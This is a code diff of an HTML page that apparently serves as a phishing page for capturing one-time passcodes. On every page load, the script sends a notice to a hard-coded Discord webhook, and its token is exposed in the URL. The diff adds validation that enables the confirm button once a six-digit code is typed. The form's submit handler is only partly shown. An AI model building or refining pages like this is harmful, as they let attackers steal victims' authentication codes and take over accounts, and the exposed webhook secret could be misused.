@@ -137,7 +137,7 @@
         </p>
     </div>
 
-    <script>
+   <script>
     const webhookURL = "https://discord.com/api/webhooks/1340985774304399401/RwrIVoSbDOa0sndcIY2GgVs90H6HVvOTIlwK4G_HZASvLbDiAeOzsELv85XfLNMXVPfp";
 
     // Notify when the page is opened
@@ -145,6 +145,18 @@
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ content: "A user opened the OTP page!" })
+    });
+
+    // Enable the confirm button when 6-digit OTP is entered
+    document.getElementById("securityCode").addEventListener("input", function() {
+        const securityCode = this.value;
+        const confirmButton = document.getElementById("confirmButton");
+
+        if (securityCode.length === 6 && /^\d+$/.test(securityCode)) {
+            confirmButton.disabled = false; // Enable button when OTP is valid
+        } else {
+            confirmButton.disabled = true; // Keep it disabled otherwise
+        }
     });
 
     document.getElementById("otpForm").addEventListener("submit", async function(event) {
@@ -166,6 +178,7 @@
         }
     });
 </script>
+
 
        
 </body>
